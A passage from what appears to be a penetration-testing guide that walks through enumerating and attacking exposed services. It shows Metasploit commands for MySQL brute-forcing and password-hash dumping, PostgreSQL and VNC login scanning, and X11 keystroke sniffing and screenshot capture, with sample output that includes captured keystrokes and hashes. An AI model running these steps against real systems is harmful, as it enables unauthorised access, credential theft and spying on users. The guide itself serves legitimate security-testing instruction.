<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[43852.014179] scsi host6: iSCSI Initiator over TCP/IP
</span><span class='line'>[43852.306055] scsi 6:0:0:0: Direct-Access     EMC      Celerra          0002 PQ: 1 ANSI: 5
</span><span class='line'>[43852.323940] scsi 6:0:0:0: Attached scsi generic sg1 type 0</span></code></pre></td></tr></table></div></figure></li>
<li>Sucessful Result: If we see, the drive is attached to sdb1
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[125933.964768] scsi host10: iSCSI Initiator over TCP/IP
</span><span class='line'>[125934.259637] scsi 10:0:0:0: Direct-Access     LIO-ORG  FILEIO           v2.  PQ: 0 ANSI: 2
</span><span class='line'>[125934.259919] sd 10:0:0:0: Attached scsi generic sg1 type 0
</span><span class='line'>[125934.266155] sd 10:0:0:0: [sdb] 2097152001 512-byte logical blocks: (1.07 TB/1000 GiB)
</span><span class='line'>[125934.266794] sd 10:0:0:0: [sdb] Write Protect is off
</span><span class='line'>[125934.266801] sd 10:0:0:0: [sdb] Mode Sense: 2f 00 00 00
</span><span class='line'>[125934.268003] sd 10:0:0:0: [sdb] Write cache: disabled, read cache: enabled, doesn&rsquo;t support DPO or FUA
</span><span class='line'>[125934.275206]  sdb: sdb1
</span><span class='line'>[125934.279017] sd 10:0:0:0: [sdb] Attached SCSI dis</span></code></pre></td></tr></table></div></figure></li>
<li>We can logout using &ndash;logout
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>iscsiadm -m node &ndash;targetname=&ldquo;iqn.1992-05.com.emc:fl1001433000190000-3-vnxe&rdquo; -p 192.168.xx.xx &ndash;logout
</span><span class='line'>Logging out of session [sid: 6, target: iqn.1992-05.com.emc:fl1001433000190000-3-vnxe, portal: 192.168.xx.xx,3260]
</span><span class='line'>Logout of [sid: 6, target: iqn.1992-05.com.emc:fl1001433000190000-3-vnxe, portal: 192.168.xx.xx,3260] successful.</span></code></pre></td></tr></table></div></figure></li>
<li>We can find more information about it by just using without any &ndash;login/&ndash;logout parameter
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>iscsiadm -m node &ndash;targetname=&ldquo;iqn.1992-05.com.emc:fl1001433000190000-3-vnxe&rdquo; -p 192.168.xx.xx
</span><span class='line'># BEGIN RECORD 2.0-873
</span><span class='line'>node.name = iqn.1992-05.com.emc:fl1001433000190000-3-vnxe
</span><span class='line'>node.tpgt = 1
</span><span class='line'>node.startup = manual
</span><span class='line'>node.leading_login = No
</span><span class='line'>iface.hwaddress = &lt;empty&gt;
</span><span class='line'>iface.ipaddress = &lt;empty&gt;
</span><span class='line'>iface.iscsi_ifacename = default
</span><span class='line'>iface.net_ifacename = &lt;empty&gt;
</span><span class='line'>iface.transport_name = tcp
</span><span class='line'>iface.initiatorname = &lt;empty&gt;
</span><span class='line'>iface.bootproto = &lt;empty&gt;
</span><span class='line'>iface.subnet_mask = &lt;empty&gt;
</span><span class='line'>iface.gateway = &lt;empty&gt;
</span><span class='line'>iface.ipv6_autocfg = &lt;empty&gt;
</span><span class='line'>iface.linklocal_autocfg = &lt;empty&gt;
</span><span class='line'>iface.router_autocfg = &lt;empty&gt;
</span><span class='line'>iface.ipv6_linklocal = &lt;empty&gt;
</span><span class='line'>iface.ipv6_router = &lt;empty&gt;
</span><span class='line'>iface.state = &lt;empty&gt;
</span><span class='line'>iface.vlan_id = 0
</span><span class='line'>iface.vlan_priority = 0
</span><span class='line'>iface.vlan_state = &lt;empty&gt;
</span><span class='line'>iface.iface_num = 0
</span><span class='line'>iface.mtu = 0
</span><span class='line'>iface.port = 0
</span><span class='line'>node.discovery_address = 192.168.xx.xx
</span><span class='line'>node.discovery_port = 3260
</span><span class='line'>node.discovery_type = send_targets
</span><span class='line'>node.session.initial_cmdsn = 0
</span><span class='line'>node.session.initial_login_retry_max = 8
</span><span class='line'>node.session.xmit_thread_priority = -20
</span><span class='line'>node.session.cmds_max = 128
</span><span class='line'>node.session.queue_depth = 32
</span><span class='line'>node.session.nr_sessions = 1
</span><span class='line'>node.session.auth.authmethod = None
</span><span class='line'>node.session.auth.username = &lt;empty&gt;
</span><span class='line'>node.session.auth.password = &lt;empty&gt;
</span><span class='line'>node.session.auth.username_in = &lt;empty&gt;
</span><span class='line'>node.session.auth.password_in = &lt;empty&gt;
</span><span class='line'>node.session.timeo.replacement_timeout = 120
</span><span class='line'>node.session.err_timeo.abort_timeout = 15
</span><span class='line'>node.session.err_timeo.lu_reset_timeout = 30
</span><span class='line'>node.session.err_timeo.tgt_reset_timeout = 30
</span><span class='line'>node.session.err_timeo.host_reset_timeout = 60
</span><span class='line'>node.session.iscsi.FastAbort = Yes
</span><span class='line'>node.session.iscsi.InitialR2T = No
</span><span class='line'>node.session.iscsi.ImmediateData = Yes
</span><span class='line'>node.session.iscsi.FirstBurstLength = 262144
</span><span class='line'>node.session.iscsi.MaxBurstLength = 16776192
</span><span class='line'>node.session.iscsi.DefaultTime2Retain = 0
</span><span class='line'>node.session.iscsi.DefaultTime2Wait = 2
</span><span class='line'>node.session.iscsi.MaxConnections = 1
</span><span class='line'>node.session.iscsi.MaxOutstandingR2T = 1
</span><span class='line'>node.session.iscsi.ERL = 0
</span><span class='line'>node.conn[0].address = 192.168.xx.xx
</span><span class='line'>node.conn[0].port = 3260
</span><span class='line'>node.conn[0].startup = manual
</span><span class='line'>node.conn[0].tcp.window_size = 524288
</span><span class='line'>node.conn[0].tcp.type_of_service = 0
</span><span class='line'>node.conn[0].timeo.logout_timeout = 15
</span><span class='line'>node.conn[0].timeo.login_timeout = 15
</span><span class='line'>node.conn[0].timeo.auth_timeout = 45
</span><span class='line'>node.conn[0].timeo.noop_out_interval = 5
</span><span class='line'>node.conn[0].timeo.noop_out_timeout = 5
</span><span class='line'>node.conn[0].iscsi.MaxXmitDataSegmentLength = 0
</span><span class='line'>node.conn[0].iscsi.MaxRecvDataSegmentLength = 262144
</span><span class='line'>node.conn[0].iscsi.HeaderDigest = None
</span><span class='line'>node.conn[0].iscsi.DataDigest = None
</span><span class='line'>node.conn[0].iscsi.IFMarker = No
</span><span class='line'>node.conn[0].iscsi.OFMarker = No
</span><span class='line'># END RECORD
</span></code></pre></td></tr></table></div></figure></li>
</ol></p>

<h3>MySQL | Port 3306</h3>

<p><strong>Metasploit</strong> has</p>

<p><ol>
<li><strong>MySQL Server Version Enumeration</strong> : Enumerates the version of MySQL servers
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/mysql/mysql_version
</span><span class='line'>services -p 3306 -u -R</span></code></pre></td></tr></table></div></figure>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[<em>] 10.7.xx.xx:3306 is running MySQL, but responds with an error: \x04Host &lsquo;10.10.3.71&rsquo; is not allowed to connect to this MySQL server
</span><span class='line'>[</em>] 10.10.xx.xx:3306 is running MySQL 5.5.47-0ubuntu0.14.04.1-log (protocol 10)
</span><span class='line'>[<em>] 10.10.xx.xx:3306 is running MySQL 5.5.47-0ubuntu0.14.04.1-log (protocol 10)
</span><span class='line'>[</em>] Scanned  5 of 44 hosts (11% complete)
</span><span class='line'>[<em>] 10.10.xx.xx:3306 is running MySQL 5.1.52 (protocol 10)
</span><span class='line'>[</em>] 10.10.xx.xx:3306 is running MySQL 5.1.52 (protocol 10)
</span><span class='line'>[<em>] 10.10.xx.xx:3306 is running MySQL 5.5.35-0ubuntu0.12.04.2 (protocol 10)
</span><span class='line'>[</em>] 10.10.xx.xx:3306 is running MySQL 5.0.95 (protocol 10)
</span><span class='line'>[<em>] Scanned  9 of 44 hosts (20% complete)
</span><span class='line'>[</em>] 10.10.xx.xx:3306 is running MySQL 5.0.22 (protocol 10)
</span><span class='line'>[<em>] 10.10.xx.xx:3306 is running MySQL, but responds with an error: \x04Host &lsquo;10.10.3.71&rsquo; is not allowed to connect to this MySQL server
</span><span class='line'>[</em>] 10.10.xx.xx:3306 is running MySQL, but responds with an error: \x04Host &lsquo;10.10.3.71&rsquo; is not allowed to connect to this MariaDB server
</span><span class='line'>[<em>] 10.10.xx.xx:3306 is running MySQL 5.0.22 (protocol 10)
</span><span class='line'>[</em>] 10.10.xx.xx:3306 is running MySQL, but responds with an error: \x04Host &lsquo;10.10.3.71&rsquo; is not allowed to connect to this MySQL server
</span><span class='line'>[<em>] Scanned 14 of 44 hosts (31% complete)
</span><span class='line'>[</em>] 10.10.xx.xx:3306 is running MySQL, but responds with an error: \x04Host &lsquo;10.10.3.71&rsquo; is not allowed to connect to this MySQL server
</span><span class='line'>[<em>] 10.10.xx.xx:3306 is running MySQL 5.0.22 (protocol 10)
</span><span class='line'>[</em>] 10.10.xx.xx:3306 is running MySQL, but responds with an error: \x04Host &lsquo;10.10.3.71&rsquo; is not allowed to connect to this MySQL server
</span><span class='line'>[<em>] 10.10.xx.xx:3306 is running MySQL 5.1.52 (protocol 10)
</span><span class='line'>[</em>] Scanned 18 of 44 hosts (40% complete)
</span><span class='line'>[<em>] 10.10.xx.xx:3306 is running MySQL 3.23.41 (protocol 10)
</span><span class='line'>[</em>] 10.10.xx.xx:3306 is running MySQL 3.23.41 (protocol 10)
</span><span class='line'>[<em>] 10.10.xx.xx:3306 is running MySQL 5.6.17 (protocol 10)
</span><span class='line'>[</em>] 10.10.xx.xx:3306 is running MySQL 5.1.50-community (protocol 10)</span></code></pre></td></tr></table></div></figure>
</li>
<li><strong>MySQL Login Utility</strong> to validate login or bruteforce logins. This module simply queries the MySQL instance for a specific user/pass (default is root with blank)</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/mysql/mysql_login
</span><span class='line'>services -p 3306 -u -R
</span><span class='line'>set username root
</span><span class='line'>set password example@123</span></code></pre></td></tr></table></div></figure>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[<em>] 10.10.xx.xx:3306 MYSQL - Found remote MySQL version 5.1.50
</span><span class='line'>[+] 10.10.xx.xx:3306 MYSQL - Success: &lsquo;root:example@123&rsquo;
</span><span class='line'>[</em>] Scanned 22 of 44 hosts (50% complete)
</span><span class='line'>[<em>] 10.10.xx.xx:3306 MYSQL - Found remote MySQL version 5.1.50
</span><span class='line'>[+] 10.10.xx.xx:3306 MYSQL - Success: &lsquo;root:example@123&rsquo;
</span><span class='line'>[-] 10.10.xx.xx:3306 MYSQL - Unsupported target version of MySQL detected. Skipping.
</span><span class='line'>[-] 10.10.xx.xx:3306 MYSQL - Unsupported target version of MySQL detected. Skipping.
</span><span class='line'>[</em>] 10.10.xx.xx:3306 MYSQL - Found remote MySQL version 5.6.15
</span><span class='line'>[-] 10.10.xx.xx:3306 MYSQL - LOGIN FAILED: root:example@123 (Incorrect: </span></code></pre></td></tr></table></div></figure>
</li>
<li>Once we have to username passsword for the root we can use <strong>MYSQL Password Hashdump</strong> to extract the usernames and encrypted password hashes from a MySQL server.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/mysql/mysql_hashdump
</span><span class='line'>creds -p 3306 -t password -u root -R
</span><span class='line'>set username root
</span><span class='line'>set password example@123</span></code></pre></td></tr></table></div></figure>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[-] MySQL Error: RbMysql::HandshakeError Bad handshake
</span><span class='line'>[-] There was an error reading the MySQL User Table
</span><span class='line'>[<em>] Scanned 4 of 6 hosts (66% complete)
</span><span class='line'>[+] Saving HashString as Loot: root:</em>6FE073B02F77230C092415032F0FF0951FXXXXXX
</span><span class='line'>[+] Saving HashString as Loot: wordpress:<em>A31B8F449706C32558ABC788DDABF62DCCXXXXXX
</span><span class='line'>[+] Saving HashString as Loot: root:</em>6FE073B02F77230C092415032F0FF0951FXXXXXX
</span><span class='line'>[<em>] Scanned 5 of 6 hosts (83% complete)
</span><span class='line'>[+] Saving HashString as Loot: newsgroupdbo:</em>6FE073B02F77230C092415032F0FF0951FXXXXXX
</span><span class='line'>[+] Saving HashString as Loot: intiadda:<em>6FE073B02F77230C092415032F0FF0951XXXXXX
</span><span class='line'>[+] Saving HashString as Loot: newsgroupdbo:</em>6FE073B02F77230C092415032F0FF0951FXXXXXX</span></code></pre></td></tr></table></div></figure>
</li>
</ol></p>

<p>Once we have the username and password, we can use
<ol>
<li><strong>mysql utility</strong> to login in to the server.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mysql -u root -p -h 10.10.xx.xx</span></code></pre></td></tr></table></div></figure>
</li>
</ol></p>

<p>Explore UDF functionality and vulnerablity!!</p>

<h3>Postgresql | Port 5432</h3>

<p><strong>Metasploit</strong> has
<ol>
<li><strong>PostgreSQL Version Probe</strong> : Enumerates the verion of PostgreSQL servers.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/postgres/postgres_version</span></code></pre></td></tr></table></div></figure>
</li>
<li><strong>PostgreSQL Login Utility</strong>: This module attempts to authenticate against a PostgreSQL instance using username and password combinations indicated by the USER_FILE,
  PASS_FILE, and USERPASS_FILE options.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/postgres/postgres_login</span></code></pre></td></tr></table></div></figure></li>
<li><strong>PostgreSQL Database Name Command Line Flag Injection</strong>: identify PostgreSQL 9.0, 9.1, and 9.2 servers that are vulnerable to command-line flag injection through CVE-2013-1899. This can lead to denial of service, privilege escalation, or even arbitrary code execution
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/postgres/postgres_dbname_flag_injection</span></code></pre></td></tr></table></div></figure>
</li>
</ol></p>

<h3>VNC | Port 5900</h3>

<p>We always find openVNCs in an engagement.</p>

<p><strong>Metasploit</strong> has
<ol>
<li><strong>VNC Authentication None Detection</strong>: Detect VNC servers that support the &ldquo;None&rdquo; authentication method.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/vnc/vnc_none_auth</span></code></pre></td></tr></table></div></figure>
</li>
<li><strong>VNC Authentication Scanner</strong>:   This module will test a VNC server on a range of machines and report successful logins. Currently it supports RFB protocol version 3.3, 3.7, 3.8 and 4.001 using the VNC challenge response authentication method.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/vnc/vnc_login</span></code></pre></td></tr></table></div></figure></li>
</ol></p>

<h3>X11 | Port 6000</h3>

<p>We do also find a lot of open X11 servers, we can use x11 to find the keyboard strokes and screenshots.</p>

<p><strong>Metasploit</strong> has
<ol>
<li>
<strong>X11 No-Auth Scanner</strong>: This module scans for X11 servers that allow anyone to connect without authentication.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>auxiliary/scanner/x11/open_x11
</span><span class='line'>services -p 6000 -u -R</span></code></pre></td></tr></table></div></figure>
Sample output
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[<em>] 10.9.xx.xx Access Denied
</span><span class='line'>[</em>] 10.9.xx.xx Open X Server (The XFree86 Project, Inc)
</span><span class='line'>
</span><span class='line'>[<em>] Scanned  5 of 45 hosts (11% complete)
</span><span class='line'>[-] No response received due to a timeout
</span><span class='line'>[</em>] 10.10.xx.xx Access Denied
</span><span class='line'>[<em>] Scanned  9 of 45 hosts (20% complete)
</span><span class='line'>[</em>] 10.11.xx.xx Access Denied
</span><span class='line'>[<em>] Scanned 14 of 45 hosts (31% complete)
</span><span class='line'>[</em>] 10.15.xx.xx Access Denied
</span><span class='line'>[<em>] Scanned 18 of 45 hosts (40% complete)
</span><span class='line'>[</em>] 10.19.xx.xx Access Denied
</span><span class='line'>[<em>] Scanned 23 of 45 hosts (51% complete)
</span><span class='line'>[</em>] Scanned 27 of 45 hosts (60% complete)
</span><span class='line'>[<em>] Scanned 32 of 45 hosts (71% complete)
</span><span class='line'>[</em>] 10.20.xx.xx Open X Server (Xfree86-Heidenhain-Project)
</span><span class='line'>[<em>] Scanned 36 of 45 hosts (80% complete)
</span><span class='line'>[</em>] Scanned 41 of 45 hosts (91% complete)
</span><span class='line'>[<em>] 10.87.xx.xx Access Denied
</span><span class='line'>[</em>] Scanned 45 of 45 hosts (100% complete)
</span><span class='line'>[*] Auxiliary module execution completed</span></code></pre></td></tr></table></div></figure>
</li>
</ol></p>

<p>We can use
<ol>
<li><a href="http://tools.kali.org/sniffingspoofing/xspy">xspy</a> to sniff the keyboard keystrokes.</p>

<p>Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>xspy 10.9.xx.xx
</span><span class='line'>
</span><span class='line'>opened 10.9.xx.xx:0 for snoopng
</span><span class='line'>swaBackSpaceCaps_Lock josephtTabcBackSpaceShift_L workShift_L 2123
</span><span class='line'>qsaminusKP_Down KP_Begin KP_Down KP_Left KP_Insert TabRightLeftRightDeletebTabDownnTabKP_End KP_Right KP_Up KP_Down KP_Up KP_Up TabmtminusdBackSpacewinTab</span></code></pre></td></tr></table></div></figure>
</li></p>

<p><li>We can also use x11 to grab <strong>screenshots or live videos</strong> of the user. We need to  verify the connection is open and we can get to it:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>xdpyinfo -display &lt;ip&gt;:&lt;display&gt;</span></code></pre></td></tr></table></div></figure>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>xdpyinfo -display 10.20.xx.xx:0
</span><span class='line'>name of display:    10.20.xx.xx:0
</span><span class='line'>version number:    11.0
</span><span class='line'>vendor string:    Xfree86-Heidenhain-Project
</span><span class='line'>vendor release number:    0
</span><span class='line'>maximum request size:  262140 bytes
</span><span class='line'>motion buffer size:  0
</span><span class='line'>bitmap unit, bit order, padding:    32, LSBFirst, 32
</span><span class='line'>image byte order:    LSBFirst
</span><span class='line'>number of supported pixmap formats:    6
</span><span class='line'>supported pixmap formats:
</span><span class='line'>    depth 1, bits_per_pixel 1, scanline_pad 32
</span><span class='line'>    depth 4, bits_per_pixel 8, scanline_pad 32
</span><span class='line'>    depth 8, bits_per_pixel 8, scanline_pad 32
</span><span class='line'>    depth 15, bits_per_pixel 16, scanline_pad 32
</span><span class='line'>    depth 16, bits_per_pixel 16, scanline_pad 32
</span><span class='line'>    depth 24, bits_per_pixel 32, scanline_pad 32
</span><span class='line'>keycode range:    minimum 8, maximum 255
</span><span class='line'>focus:  window 0x600005, revert to Parent
</span><span class='line'>number of extensions:    11
</span><span class='line'>    FontCache
</span><span class='line'>    MIT-SCREEN-SAVER
</span><span class='line'>    MIT-SHM
</span><span class='line'>    RECORD
</span><span class='line'>    SECURITY
</span><span class='line'>    SHAPE
</span><span class='line'>    XC-MISC
</span><span class='line'>    XFree86-DGA
</span><span class='line'>    XFree86-VidModeExtension
</span><span class='line'>    XInputExtension
</span><span class='line'>    XVideo
</span><span class='line'>default screen number:    0
</span><span class='line'>number of screens:    1
</span><span class='line'>
</span><span class='line'>screen #0:
</span><span class='line'>  dimensions:    1024x768 pixels (347x260 millimeters)
</span><span class='line'>  resolution:    75x75 dots per inch
</span><span class='line'>  depths (6):    16, 1, 4, 8, 15, 24
</span><span class='line'>  root window id:    0x25
</span><span class='line'>  depth of root window:    16 planes
</span><span class='line'>  number of colormaps:    minimum 1, maximum 1
</span><span class='line'>  default colormap:    0x20
</span><span class='line'>  default number of colormap cells:    64
</span><span class='line'>  preallocated pixels:    black 0, white 65535
</span><span class='line'>  options:    backing-store NO, save-unders NO
</span><span class='line'>  largest cursor:    32x32
</span><span class='line'>  current input event mask:    0x0
</span><span class='line'>  number of visuals:    2
</span><span class='line'>  default visual id:  0x21
</span><span class='line'>  visual:
</span><span class='line'>    visual id:    0x21
</span><span class='line'>    class:    TrueColor
</span><span class='line'>    depth:    16 planes
</span><span class='line'>    available colormap entries:    64 per subfield
</span><span class='line'>    red, green, blue masks:    0xf800, 0x7e0, 0x1f
</span><span class='line'>    significant bits in color specification:    6 bits
</span><span class='line'>  visual:
</span><span class='line'>    visual id:    0x22
</span><span class='line'>    class:    DirectColor
</span><span class='line'>    depth:    16 planes
</span><span class='line'>    available colormap entries:    64 per subfield
</span><span class='line'>    red, green, blue masks:    0xf800, 0x7e0, 0x1f
</span><span class='line'>    significant bits in color specification:    6 bits</span></code></pre></td></tr></table></div></figure></p>

<p>To take the <strong>screenshot</strong> use:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>xwd -root -display 10.20.xx.xx:0 -out xdump.xdump
</span><span class='line'>display xdump.xdump</span></code></pre></td></tr></table></div></figure>
<strong>live viewing</strong>:
First we need to find the ID of the window using xwininfo
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>xwininfo -root -display 10.9.xx.xx:0
</span><span class='line'>
</span><span class='line'>xwininfo: Window id: 0x45 (the root window) (has no name)
</span><span class='line'>
</span><span class='line'>  Absolute upper-left X:  0
</span><span class='line'>  Absolute upper-left Y:  0
</span><span class='line'>  Relative upper-left X:  0
